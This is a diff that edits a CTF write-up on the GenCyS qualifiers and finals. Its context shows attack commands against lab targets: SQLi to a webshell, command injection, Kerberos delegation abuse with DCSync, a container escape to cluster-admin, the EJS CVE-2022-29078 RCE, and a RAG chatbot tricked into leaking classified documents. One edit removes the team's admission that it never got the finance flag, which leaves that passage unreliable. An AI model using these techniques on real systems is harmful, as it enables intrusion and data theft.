@@ -34,7 +34,6 @@ The scoreboard lives at `gencysctf.com`, a CTFd instance dressed up in a neon "h
 CTFd is boringly scriptable, which is what you want when you're racing a clock:
 
 ```bash
-# list every challenge with category + value + whether it's solved
 curl -s -b cj.txt https://gencysctf.com/api/v1/challenges | jq -r \
   '.data[] | "\(.id) | \(.name) | \(.category) | \(.value) | solved=\(.solved_by_me)"'
 ```
@@ -60,7 +59,7 @@ curl -s -b cj.txt https://gencysctf.com/api/v1/challenges | jq -r \
  27 | The Broken Crypto           | Cryptography        | 200 | solved=False
 ```
 
-Two things stood out. First, **not a single challenge shipped a file through CTFd**: no attachments, no connection info. Everything lived on the live `thesecuretrust.com` infrastructure and you had to go find it. Second, the organizers leaned hard into that on Discord:
+Two things stood out. First, not a single challenge shipped a file through CTFd: no attachments, no connection info. Everything lived on the live `thesecuretrust.com` infrastructure and you had to go find it. Second, the organizers leaned hard into that on Discord:
 
 {{< figure src="discord-recon.jpg" alt="GKS in the CTF Discord: reconnaissance is your primary weapon; perimeter compromise hinges on OSINT, artifact analysis, and tactical surface mapping" >}}
 
@@ -112,7 +111,6 @@ The three heaviest boxes on the board fell first: Cloud, AD, and the ZigBee gate
 An Azure supply-chain. It starts in the **ServiceDesk** tickets, which reference an internal backup blob container: `strustbkupa9ad09.blob.core.windows.net/backups/`. The container is public, but the *current* `terraform.tfstate` is scrubbed. The trick is that Azure Blob keeps **versions**, and an older version of the state file still had a storage key baked in:
 
 ```bash
-# list blob versions, then pull an old one by versionId
 curl -s -H "x-ms-version: 2021-08-06" \
   "https://strustbkupa9ad09.blob.core.windows.net/backups/terraform.tfstate?versionId=2026-08-15T08:21:50.76Z"
 ```
@@ -159,7 +157,7 @@ It wants a `message` and a `sessionId`. Give it both and you get a reply, but th
 }
 ```
 
-`foundFragments` and `accessedDocs`. That's the tell. This bot searches documents and reports which ones it touched. Digging into the frontend bundle (`3y0fq5med_8_p.js`) confirmed the whole game:
+`foundFragments` and `accessedDocs`. That's the tell. This bot searches documents and reports which ones it touched. Digging into the frontend bundle (`3y0fq5med_8_p.js`) confirmed it:
 
 ```js
 if (r.foundFragments) S(r.foundFragments);
@@ -172,14 +170,13 @@ r.foundFragments && r.foundFragments.length === 3 && B(
 );
 ```
 
-So it isn't a "jailbreak the system prompt" puzzle at all. It's **broken access control in a RAG pipeline**. Three flag-fragment "security tokens" are scattered across classified documents. Normal chit-chat never surfaces them, and the bot deflects meta questions with a fake *"I'm handling a high volume of requests"* brush-off. The knowledge base spells out the bug itself, in document `INT-001`:
+So it isn't a "jailbreak the system prompt" puzzle at all. It's broken access control in a RAG pipeline. Three flag-fragment "security tokens" are scattered across classified documents. Normal chit-chat never surfaces them, and the bot deflects meta questions with a fake *"I'm handling a high volume of requests"* brush-off. The knowledge base spells out the bug itself, in document `INT-001`:
 
 > *"The search interface bypasses document-level classification filtering. This is a known issue scheduled for remediation in v2.4."*
 
 That's the vulnerability. Classification is enforced **after** retrieval, not before, so if you can make the search run, it returns `[RESTRICTED]` and `[CLASSIFIED]` documents verbatim. And the words that flip it from "chat" mode into raw "search" mode are literally **`search knowledge base for ...`**. Two searches surfaced all three tokens (keeping one stable `sessionId` so the server accumulates them):
 
 ```bash
-# fragment 1 + 2
 curl -s https://thesecuretrust.com/api/chat -H 'Content-Type: application/json' -d '{
   "message":"search knowledge base for onboarding and staff documents",
   "sessionId":"run-1"}'
@@ -464,7 +461,6 @@ There it is: **`/host`**, the node's entire root filesystem mounted into the pod
 `rotate-flag.sh` is basically the answer key, an AD-style rotating flag stored in a Kubernetes Secret:
 
 ```bash
-# /host/opt/gencys-k8s/rotate-flag.sh (excerpt)
 NS="securetrust-corebanking"; SECRET="core-banking-flag-key"
 FLAG="UST_GenCyS_CTF{$(openssl rand -hex 32)}"
 kubectl -n "$NS" patch secret "$SECRET" --type merge \
@@ -522,9 +518,9 @@ Find where a challenge lives, name the vulnerability, then break it. The rest is
 
 ## Finals
 
-The finals ran the same way the quals did: no files and no connection info through CTFd, just a name under `*.thesecuretrust.com` for each challenge and the job of figuring out where it actually lived. What made them a different beast was the scale. This time the whole board hung together as one fictional healthcare group, HealthShield, spread across a single interconnected estate, and the honest way to describe it is one long red team assessment. You start with recon and OSINT to map the perimeter, find a way in, then move laterally across an AD estate, a Kubernetes cluster, a boot2root, some IoT gear, a couple of mobile apps, and a stack of web and API services, picking up flags on the way to Domain Admin and cluster-admin.
+The finals ran the same way the quals did: no files and no connection info through CTFd, just a name under `*.thesecuretrust.com` for each challenge and the job of figuring out where it actually lived. What made them a different beast was the scale. This time the whole board hung together as one fictional healthcare group, HealthShield, spread across a single interconnected estate that plays as one long red team assessment. You start with recon and OSINT to map the perimeter, find a way in, then move laterally across an AD estate, a Kubernetes cluster, a boot2root, some IoT gear, a couple of mobile apps, and a stack of web and API services, picking up flags on the way to Domain Admin and cluster-admin.
 
-One hard rule up front: don't `nmap -p-` these boxes. A full-port scan trips an automatic ban that firewalls the good ports (SSH, SMB) for your IP, and there's no undoing it. We found that out on `connections` and it quietly cost us a flag.
+One hard rule up front: don't `nmap -p-` these boxes. A full-port scan trips an automatic ban that firewalls the good ports (SSH, SMB) for your IP, and there's no undoing it. We found that out on `connections`, where it firewalled our own vantage off the box.
 
 **Points: 9050 (+500)**
 
@@ -649,7 +645,7 @@ The spray lands two service accounts, `svc_scan` on `Autumn2025!` and `svc_sql` 
 impacket-findDelegation 'medcore.health/svc_scan:Autumn2025!' -dc-ip 20.44.55.78
 ```
 
-So we S4U2Self+S4U2Proxy to mint a CIFS ticket impersonating `ctfadmin` (RID 500, Domain Admin), and DCSync, with no golden ticket needed, which is exactly what the flag winks at:
+So we S4U2Self+S4U2Proxy to mint a CIFS ticket impersonating `ctfadmin` (RID 500, Domain Admin), and DCSync, with no golden ticket needed, which the flag name references:
 
 ```bash
 impacket-getST -spn CIFS/GenCyS-AD-DC01.medcore.health -impersonate ctfadmin \
@@ -715,7 +711,7 @@ rtt min/avg/max/mdev = 0.044/0.044/0.044/0.000 ms
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-The pod is the whole game because it's privileged with `hostPath "/"` mounted at `/host`, so the node's entire filesystem is right there, including the k3s node admin cert, which is cluster-admin:
+The pod itself is enough, because it's privileged with `hostPath "/"` mounted at `/host`, so the node's entire filesystem is right there, including the k3s node admin cert, which is cluster-admin:
 
 ```bash
 mount | grep /host
@@ -743,13 +739,23 @@ testing
 vault-prod
 ```
 
-Walk the namespaces, read the challenge's own flag secret in `vault-prod`, done. That `vault-prod/final-flag` secret decodes to a `GenCyS_PROOF{...}` stage token, not the scored string; the per-team `UST_GenCyS_CTF{...}` flag is minted by the in-cluster `gcyfs-scoring` NodePort service on `:30082`. (More on what *else* was in that cluster below.) Its sibling Nightmare (RBAC, a separate cluster) landed too, via a teammate.
+Walk the namespaces and read the challenge's own flag secret in `vault-prod`:
+
+```bash
+chroot /host /usr/local/bin/k3s kubectl -n vault-prod get secret final-flag -o jsonpath='{.data.FLAG4}' | base64 -d
+```
+
+```text
+GenCyS_PROOF{stage4-final-f4e45daa9659690d2fc21c8e}
+```
+
+That `vault-prod/final-flag` secret decodes to a `GenCyS_PROOF{...}` stage token, not the scored string; the per-team `UST_GenCyS_CTF{...}` flag is minted by the in-cluster `gcyfs-scoring` NodePort service on `:30082`. (More on what *else* was in that cluster below.) Its sibling Nightmare (RBAC, a separate cluster) landed too, via a teammate.
 
 ### Boot2Root
 
 #### LifeBridge
 
-A four-tier privilege ladder on `lifebridge.thesecuretrust.com`, and a fun one.
+A four-tier privilege ladder on `lifebridge.thesecuretrust.com`.
 
 **Initial access as www-data, via blind SQLi to a webshell.** `claim_status.php` is blind-injectable on `policy`. A plain `UNION SELECT` trips the WAF:
 
@@ -853,7 +859,7 @@ UST_GenCyS_CTF{bl1nd_sql1_2_r00t_cl41ms_pwn3d}
 
 {{< figure src="web-benefits.png" alt="Enterprise Claims & Operations Gateway" >}}
 
-The map called this SSTI; verifying says otherwise. There is no SSTI. What's exposed is OS command injection and an arbitrary file read, with a `DECOY_FLAG` env var to waste your time:
+The map called this SSTI; verifying says otherwise. There is no SSTI. What's exposed is OS command injection and an arbitrary file read, with a `DECOY_FLAG` env var planted as a distractor:
 
 ```bash
 curl -sk -A 'Mozilla/5.0' https://claims-platform.thesecuretrust.com/api/diagnostics/run \
@@ -904,7 +910,7 @@ curl -sk -A 'Mozilla/5.0' -H 'Content-Type: application/json' \
 {"Code":"Success","Type":"AWS-HMAC","AccessKeyId":"AKIA_NIGHTFALL_DEPLOY","SecretAccessKey":"<REDACTED-SECRET>","Token":"<REDACTED-TOKEN>"}
 ```
 
-The kill shot is a second bug: a `/rules/eval` helper permits `fmt(template)`, which is Python `str.format` with `ctx` bound to the live `fmt` function, so format-field traversal reaches `fmt.__globals__` and reads the `FLAG` global straight out of memory:
+A second bug does the rest: a `/rules/eval` helper permits `fmt(template)`, which is Python `str.format` with `ctx` bound to the live `fmt` function, so format-field traversal reaches `fmt.__globals__` and reads the `FLAG` global straight out of memory:
 
 ```bash
 curl -sk -A 'Mozilla/5.0' -H 'Content-Type: application/json' \
@@ -1070,7 +1076,9 @@ UST_GenCyS_CTF{20db1716653b42b4e66442c1dcb11860}
 
 The `api-gateway` Swagger (`/api-docs`) is fully populated, `Admin` and `Debug` tags included.
 
-{{< figure src="api-swagger.png" alt="MediConnect API Swagger" >}} Three bugs stack. First, `/debug/config` takes no auth at all and hands back the staging config. The AWS keys in it are the public `EXAMPLE` placeholders, but the database, redis, and SMTP passwords sitting next to them are live:
+{{< figure src="api-swagger.png" alt="MediConnect API Swagger" >}}
+
+Three bugs stack. First, `/debug/config` takes no auth at all and hands back the staging config. The AWS keys in it are the public `EXAMPLE` placeholders, but the database, redis, and SMTP passwords sitting next to them are live:
 
 ```bash
 curl -s https://api-gateway.thesecuretrust.com/debug/config
@@ -1110,7 +1118,7 @@ UST_GenCyS_CTF{mediconnect_endpoints_dynamic_flag}
 
 ### The Git Leak
 
-A little way in, two notices went up on the scoreboard, and one of them cracked a whole cluster of challenges wide open.
+A little way in, two notices went up on the scoreboard, and one of them opened up several challenges at once.
 
 {{< figure src="git-hint.png" alt="CTFd notifications: the Git hint, and the automated-agent ban" >}}
 
@@ -1170,7 +1178,7 @@ Most of it is decoy, the AWS keys are the well-known AWS `EXAMPLE` placeholders,
 
 {{< figure src="gitea-explore.png" alt="The healthshield-group Gitea org: fifty enterprise repositories, decoys mixed with the real challenge sources" >}}
 
-Most of them are stage-dressing (`securetrust-saml-sso`, `securetrust-pci-dss-sanitizer`, a dozen more "enterprise" repos that go nowhere), and a handful are the actual challenges hiding in the same list: `race-to-riches-claim-payout`, `operation-healthtrace-forensics`, `mediclaim-assets-forensics`, `healthcare-smart-contract`. (The notice above the hint is the organizers announcing they'd banned a competitor for automated-agent activity. Point taken, and a fair reminder to keep the scanning targeted.)
+Most of them are stage-dressing (`securetrust-saml-sso`, `securetrust-pci-dss-sanitizer`, a dozen more "enterprise" repos that go nowhere), and a handful are the actual challenges hiding in the same list: `race-to-riches-claim-payout`, `operation-healthtrace-forensics`, `mediclaim-assets-forensics`, `healthcare-smart-contract`. (The notice above the hint is the organizers announcing they'd banned a competitor for automated-agent activity.)
 
 The repos it opened up span half a dozen categories on the board, so the rest of this run is grouped under those.
 
@@ -1178,7 +1186,7 @@ The repos it opened up span half a dozen categories on the board, so the rest of
 
 #### Fix the Portal
 
-A "spot the bugs and repair them" exercise over a Java/Spring claims portal, where the grader is the project's own immutable CI pipeline. At launch it deletes your copies of the tests and SAST rules and restores its own, so you can't weaken the gate, you actually have to fix the code. The planted flaws are the usual enterprise sins, and each wants a real remediation:
+A "spot the bugs and repair them" exercise over a Java/Spring claims portal, where the grader is the project's own immutable CI pipeline. At launch it deletes your copies of the tests and SAST rules and restores its own, so you can't weaken the gate, you actually have to fix the code. The planted flaws are common enterprise defects, and each wants a real remediation:
 
 - **Auth:** swap MD5 password storage for BCrypt and rip out the `admin` / `admin123` backdoor.
 - **JWT:** drop the hardcoded signing key, load `jwt.secret` from `JWT_SECRET`, and size the HMAC key consistently across the auth and transaction modules.
@@ -1266,7 +1274,7 @@ UST_GenCyS_CTF{167c39ff8a1d68deca4aa0ea847932c7}
 
 #### Dependency Crisis
 
-The `@healthshield/claim-engine` package pins `ejs` to `3.1.6`, and the authenticated `/api/statement/preview` route passes customer-controlled `options` straight into `ejs.render`. That is CVE-2022-29078: EJS interpolates `outputFunctionName` into generated JavaScript without checking it is a valid identifier, so you get server-side code execution. The web container also holds an `INTERNAL_API_KEY` and still exposes a leftover `/.dev` static mount, and those two facts are the whole pivot. The solver chains it end to end:
+The `@healthshield/claim-engine` package pins `ejs` to `3.1.6`, and the authenticated `/api/statement/preview` route passes customer-controlled `options` straight into `ejs.render`. That is CVE-2022-29078: EJS interpolates `outputFunctionName` into generated JavaScript without checking it is a valid identifier, so you get server-side code execution. The web container also holds an `INTERNAL_API_KEY` and still exposes a leftover `/.dev` static mount, and those two facts enable the pivot. The solver chains it end to end:
 
 ```bash
 docker compose up --build -d
@@ -1303,13 +1311,13 @@ UST_GenCyS_CTF{e874e3ddbdcf6fa91a2d1777673e59ea}
 
 #### HealthCare Contract
 
-The one smart-contract challenge: `healthcare-smart-contract`, a Foundry project that is 100% Solidity. It ships a DeFi lending pool called Hydra whose brief is blunt: drain all its ETH, and `isSolved()` flips true when the balance hits zero. Hydra advertises its defenses (a reentrancy guard, checks-effects-interactions in `withdraw`), and they hold up fine on the ETH functions. The gap is the NFT staking path. Staking pulls the token in with `safeTransferFrom`, which calls `onERC721Received` on your contract, and that callback lands before the staking state settles and outside the guard that protects `withdraw`. Reenter through the callback and you withdraw against balances that were never debited, draining the pool one head at a time. The flag name says the rest.
+The one smart-contract challenge: `healthcare-smart-contract`, a Foundry project that is 100% Solidity. It ships a DeFi lending pool called Hydra whose brief is blunt: drain all its ETH, and `isSolved()` flips true when the balance hits zero. Hydra advertises its defenses (a reentrancy guard, checks-effects-interactions in `withdraw`), and they hold up fine on the ETH functions. The gap is the NFT staking path. Staking pulls the token in with `safeTransferFrom`, which calls `onERC721Received` on your contract, and that callback lands before the staking state settles and outside the guard that protects `withdraw`. Reenter through the callback and you withdraw against balances that were never debited, draining the pool one head at a time. The flag name `nft_c4llb4ck_r33ntr4ncy_1s_und3rr4t3d` names the bug.
 
-The git leak also handed over a shortcut for free. The deploy script carries the flag as a default: `DeployWithFlag.s.sol` does `vm.envOr("FLAG", "UST_GenCyS_CTF{...}")`, so the intended answer was sitting in source the entire time.
+The git leak also handed over a shortcut for free. The deploy script carries the flag as a default: `DeployWithFlag.s.sol` does `vm.envOr("FLAG", "UST_GenCyS_CTF{...}")`, so the intended answer was present in source as a default value.
 
 {{< figure src="gitea-deploywithflag.png" alt="DeployWithFlag.s.sol in the healthcare-smart-contract repo, the flag baked in as the vm.envOr default" >}}
 
-`Flag.sol` is just as candid: `claimFlag()` gates on `setup.isSolved()` and then returns the literal string.
+`Flag.sol` shows the same thing: `claimFlag()` gates on `setup.isSolved()` and then returns the literal string.
 
 ```bash
 grep -n -A6 'function claimFlag' src/Flag.sol
@@ -1351,7 +1359,7 @@ disk_image.img1       2048  43007   40960  20M 83 Linux
 disk_image.img2      43008 145407  102400  50M 83 Linux
 ```
 
-Partition 1 (ext4) holds `rolled.jpg`, with a ZIP stashed inside the JPEG. Opening that ZIP with `zip_password_1337` yields `super_safe_password.txt`, and that string is the passphrase for partition 2, a LUKS1 volume (`aes-xts-plain64`). We couldn't map a device locally, so `decrypt_luks1.py` runs the PBKDF2, AES-XTS, and anti-forensic-stripe steps in userspace to unlock it, and `render_trace.py` plots what comes out:
+Partition 1 (ext4) holds `rolled.jpg`, with a ZIP stashed inside the JPEG. Carve out partition 1, dump `rolled.jpg`, and open the embedded ZIP with `zip_password_1337`, which yields `super_safe_password.txt`:
 
 ```bash
 dd if=disk_image.img of=p1.img bs=512 skip=2048 count=40960
@@ -1366,7 +1374,7 @@ warning [rolled.jpg]:  138474 extra bytes at beginning or within zipfile
 UST_GenCyS_Luks_Password!123
 ```
 
-That string is the passphrase for partition 2. `decrypt_luks1.py` runs the PBKDF2, AES-XTS, and anti-forensic-stripe steps in userspace to unlock it:
+That string is the passphrase for partition 2, a LUKS1 volume (`aes-xts-plain64`). Since we couldn't map a device locally, `decrypt_luks1.py` runs the PBKDF2, AES-XTS, and anti-forensic-stripe steps in userspace:
 
 ```bash
 printf '%s\n' 'UST_GenCyS_Luks_Password!123' | python3 decrypt_luks1.py p2.img decrypted_ext4.img
@@ -1377,7 +1385,7 @@ unlocked key slot 0 (key-material IV base 0)
 wrote 50331648 bytes (payload IV base 0) to decrypted_ext4.img
 ```
 
-The decrypted ext4 carries a GPS log of latitude and longitude strokes; `render_trace.py` plots that polyline, which literally draws the flag in block capitals.
+The decrypted ext4 carries a GPS log of latitude and longitude strokes; `render_trace.py` plots that polyline, which draws the flag in block capitals.
 
 ```bash
 debugfs -R 'dump /gps/1206112547-29099.txt 1206112547-29099.txt' decrypted_ext4.img
@@ -1428,7 +1436,7 @@ UST_GenCyS_CTF{f51ce9b05ebd0a7d29c9d6ebe0a8e90907e6123cd28ee52a579b699406961eab}
 
 #### Claims Gateway
 
-The org also held `claims-gateway-overflow`, and this one shipped an actual binary: `claimsd`, a legacy "Meridian Mutual Assurance" claims terminal. The source came with it, so the bug read itself. `claimsd.c` base64-decodes a claim into a struct whose `diag_code` is 64 bytes, checks the input against a 256-byte cap, then copies it in with a bare `strcpy`:
+The org also held `claims-gateway-overflow`, and this one shipped an actual binary: `claimsd`, a legacy "Meridian Mutual Assurance" claims terminal. The source came with it, so the bug was visible directly in the source. `claimsd.c` base64-decodes a claim into a struct whose `diag_code` is 64 bytes, checks the input against a 256-byte cap, then copies it in with a bare `strcpy`:
 
 ```c
 struct hl7_claim { char patient_id[64]; char amount[32]; char diag_code[64]; };
@@ -1436,7 +1444,7 @@ if (strlen(diag) > 256) return;     // 256-byte policy limit, 64-byte buffer
 strcpy(claim.diag_code, diag);      // no bound check
 ```
 
-The binary is built to be broken into: no PIE, no stack canary, NX off, symbols intact, which `pwntools` reads straight off the ELF:
+The binary has no exploit mitigations: no PIE, no stack canary, NX off, symbols intact, which `pwntools` reads straight off the ELF:
 
 ```bash
 python3 -c "from pwn import ELF; e=ELF('claimsd', checksec=True); print('payout_override', hex(e.symbols['payout_override']))"
@@ -1522,7 +1530,7 @@ UST_GenCyS_CTF{AeG1sH3a1thS3cur3K3y2026}
 
 #### HealthShield Mediclaim iOS
 
-The IPA is a joke at the analyst's expense: `Payload/HealthShieldCare.app/HealthShieldCare` is not a Mach-O at all, it is a Linux x86-64 ELF, and its "integrity check" only probes four jailbreak paths before exiting. The brief asks you to bypass the client-side protection and pull out the embedded secret, and the binary carries exactly one unique sensitive string, `H3althSh13ld_MachO_S3cr3t_2026!`, which matches the description word for word. The app also signs `HealthShieldCare:<PAC>:<timestamp>:<nonce>`, but it accepts any timestamp and nonce, so that signature is not a fixed answer you can read off the challenge. The embedded secret is. Feeding the reproducer an arbitrary timestamp and nonce bears that out: the secret stays put while the signature is only ever a function of those inputs. The iOS side of that run reports:
+The IPA is deliberately misleading: `Payload/HealthShieldCare.app/HealthShieldCare` is not a Mach-O at all, it is a Linux x86-64 ELF, and its "integrity check" only probes four jailbreak paths before exiting. The brief asks you to bypass the client-side protection and pull out the embedded secret, and the binary carries exactly one unique sensitive string, `H3althSh13ld_MachO_S3cr3t_2026!`, which matches the description word for word. The app also signs `HealthShieldCare:<PAC>:<timestamp>:<nonce>`, but it accepts any timestamp and nonce, so that signature is not a fixed answer you can read off the challenge. The embedded secret is. Feeding the reproducer an arbitrary timestamp and nonce bears that out: the secret stays put while the signature is only ever a function of those inputs. The iOS side of that run reports:
 
 ```bash
 python3 solve_mobile_offline.py --timestamp 1700000000 --nonce testnonce
@@ -1555,19 +1563,19 @@ UST_GenCyS_CTF{b5f2dc3720b832abab6f54fe35962f76}
 
 ### The Fun Stuff
 
-Rooting a box is half of it. Poking around afterwards is the other half, and the finals rewarded it.
+Rooting a box is half of it. Poking around afterwards is the other half.
 
 #### The decoy company in the cluster
 
-Once we had cluster-admin on ClusterFall, we walked every namespace expecting loot, and most of it turned out to be set dressing. `production`, `dev`, `testing`, and `monitoring` all exist just to make `kubectl get pods` look like a real company: postgres, redis, grafana on `admin/admin12345`, prometheus. But the cron jobs are no-ops that just `echo vacuum; sleep 1`, and every "flag" in those namespaces is a rabbit hole along the lines of `GenCyS{decoy-...-keep-looking}`. Whoever built it had a sense of humor.
+Once we had cluster-admin on ClusterFall, we walked every namespace expecting loot, and most of it turned out to be set dressing. `production`, `dev`, `testing`, and `monitoring` all exist just to make `kubectl get pods` look like a real company: postgres, redis, grafana on `admin/admin12345`, prometheus. But the cron jobs are no-ops that just `echo vacuum; sleep 1`, and every "flag" in those namespaces is a rabbit hole along the lines of `GenCyS{decoy-...-keep-looking}`.
 
 #### The scoring backend in the same cluster
 
-The service that mints flags was running inside the same cluster we were told to root, and cluster-admin reads everything, so we ended up looking straight at it. That is an unintended colocation; a scoring service should never be reachable from a challenge box. We confirmed it was real, filed it as an infra bug, and left it completely alone, because minting flags from the scoring secret is not solving a CTF. Every flag here came from popping its box, and out of the same respect the secret's value is not printed. ClusterFall was later pulled from the platform entirely, which tracks.
+The service that mints flags was running inside the same cluster we were told to root, and cluster-admin reads everything, so we ended up looking straight at it. That is an unintended colocation; a scoring service should never be reachable from a challenge box. We confirmed it was real, filed it as an infra bug, and left it completely alone, because minting flags from the scoring secret is not solving a CTF. Every flag here came from popping its box, and out of the same respect the secret's value is not printed. ClusterFall was later pulled from the platform entirely.
 
 #### The build scripts on the domain controller
 
-After Domain Admin on MedCore, we WinRM'd onto the DC and found the challenge's own build automation sitting in `C:\CTF\build\`, the scripts `01-promote-dc.ps1` through `07-flag-and-selfheal.ps1`. The flag self-heals every couple of minutes so you cannot permanently break the box, and one script carries a comment that made us laugh: `# Static flag (you said static is fine).` Reading `03-plant-vulns.ps1` is basically the intended-solution guide. The DC was also watching us: `05-edr-sysmon.ps1` stands up Sysmon, Defender, and Velociraptor, so every command we ran was logged. We checked whether that Velociraptor was a fleet console that reached other boxes, and it was not; the server and client both point at localhost.
+After Domain Admin on MedCore, we WinRM'd onto the DC and found the challenge's own build automation sitting in `C:\CTF\build\`, the scripts `01-promote-dc.ps1` through `07-flag-and-selfheal.ps1`. The flag self-heals every couple of minutes so you cannot permanently break the box, and one script carries the comment `# Static flag (you said static is fine).` Reading `03-plant-vulns.ps1` is basically the intended-solution guide. The DC was also watching us: `05-edr-sysmon.ps1` stands up Sysmon, Defender, and Velociraptor, so every command we ran was logged. We checked whether that Velociraptor was a fleet console that reached other boxes, and it was not; the server and client both point at localhost.
 
 ### Network
 
@@ -1686,11 +1694,11 @@ cat maintenance_notes.txt
 ==============================================================
 ```
 
-The last step is where it stalls: `flag.txt` in the finance share is owned by `maintenance` and only readable via that SSH shell, and `:2222` is firewalled from our source IP because an earlier full-port scan tripped the box's scan-ban. We re-verified it filtered from every vantage we controlled, so we never obtained the finance `flag.txt`. The intended solve is one `ssh` from a clean IP; ours were burned. Lesson learned the hard way: targeted scans only.
+The last step is where it stalls: `flag.txt` in the finance share is owned by `maintenance` and only readable via that SSH shell, and `:2222` is firewalled from our source IP because an earlier full-port scan tripped the box's scan-ban. We re-verified it filtered from every vantage we controlled. The flag sits behind that SSH shell, reachable with one `ssh` from a clean IP, which is what scored it; our own vantage was burned. Targeted scans only.
 
 ### Dead Ends
 
-A red team assessment is never all wins, and a few of these boxes we took completely apart and still walked away empty. Not for lack of reversing, but because the piece that actually mints the flag was never shipped in the package. They scored nothing, so none of this counts toward the total above. The work was real, though, so here is how far each one got.
+A few of these boxes we took completely apart and still walked away empty. Not for lack of reversing, but because the piece that actually mints the flag was never shipped in the package. They scored nothing, so none of this counts toward the total above. Here is how far each one got.
 
 #### ClaimSeal (Reverse Engineering)
 
@@ -1727,7 +1735,7 @@ Then sweep every candidate seed and check it against the ZIP's real AES verifier
 python3 recover_claimseal_password.py
 ```
 
-That covers 2,073,601 seeds across the 2026-08-13 to 2026-09-06 window and every timezone offset, plus seeds derived from PE timestamps, artifact hashes, and exported constants. Nothing verified. The seed that actually sealed the archive is not anywhere in the shipped files, so the password, and the flag behind it, cannot be reproduced. Zero global solves, which fits.
+That covers 2,073,601 seeds across the 2026-08-13 to 2026-09-06 window and every timezone offset, plus seeds derived from PE timestamps, artifact hashes, and exported constants. Nothing verified. The seed that actually sealed the archive is not anywhere in the shipped files, so the password, and the flag behind it, cannot be reproduced. Zero global solves.
 
 #### HealthShield Leakage (Reverse Engineering)
 
@@ -1741,7 +1749,7 @@ tshark -r vault_lan_capture.pcap -Y 'tcp.port==7331' -T fields -e data
 grep -a override_salt guard_station_dump.bin
 ```
 
-The dump holds `d140e205f9a04436756390bcdf482de4` right after the `cached_ecm_code` marker, the exact value the emulator produced; the lone port-7331 stream repeats it inside its `VX` application frame; and the dump also gives up `override_salt=VAULT_ECM_OVERRIDE_26`. Everything lined up, and then the last file refused to move. `sealed_deposit.enc` is 64 bytes and does not fall to AES, a stream cipher, or any XOR/KDF built from the recovered value. The disassembly says why: `vault_ecm.exe` calls into a custom guard-side keystream whose bytecode lives in a third binary, `vault_guard_svc.exe`, and that binary was never shipped. The memory dump names it as the source process but is a heap-only synthetic, so the stack VM state and the cipher bytecode are simply absent. No guard binary, no schedule, no plaintext.
+The dump holds `d140e205f9a04436756390bcdf482de4` right after the `cached_ecm_code` marker, the exact value the emulator produced; the lone port-7331 stream repeats it inside its `VX` application frame; and the dump also gives up `override_salt=VAULT_ECM_OVERRIDE_26`. Everything matched, but the last file did not decrypt. `sealed_deposit.enc` is 64 bytes and does not fall to AES, a stream cipher, or any XOR/KDF built from the recovered value. The disassembly says why: `vault_ecm.exe` calls into a custom guard-side keystream whose bytecode lives in a third binary, `vault_guard_svc.exe`, and that binary was never shipped. The memory dump names it as the source process but is a heap-only synthetic, so the stack VM state and the cipher bytecode are simply absent. No guard binary, no schedule, no plaintext.
 
 #### Broken Vault (Cryptography)
 
@@ -1776,4 +1784,4 @@ So the signature layer is fully broken and validated. The encryption layer is wh
 
 The second config, keyed at `0xb200`, is the obvious decoy: `decoy-c2-01.securetrust-update.com`, `CAMP-DECOY-77`, `VICT-DECOY-0000`, only 1,000 PBKDF2 iterations. Both paths get followed to the end, and both dead-end. The stage-1 binary turns out to be an explicit CTF simulator whose only drop is the fixed 18-byte stub `ST-SIM-STAGE2-STUB`, and the supplied `suspicious_file.bin` just prints the recovered identifiers and sleeps, with no crypto or exfil left to reverse. The one flag-shaped value on the intended path is a planted `ledger_token` that was already rejected as a decoy back in the legacy version of this challenge.
 
-The through-line on all four is the same one from the buffer overflow: the analysis is right, but the flag-bearing artifact, a seed, a guard binary, a real KDF, a live C2, was never deployed. Every one still shows zero solves globally, which tracks.
+The through-line on all four is the same one from the buffer overflow: the analysis is right, but the flag-bearing artifact, a seed, a guard binary, a real KDF, a live C2, was never deployed. Every one still shows zero solves globally.
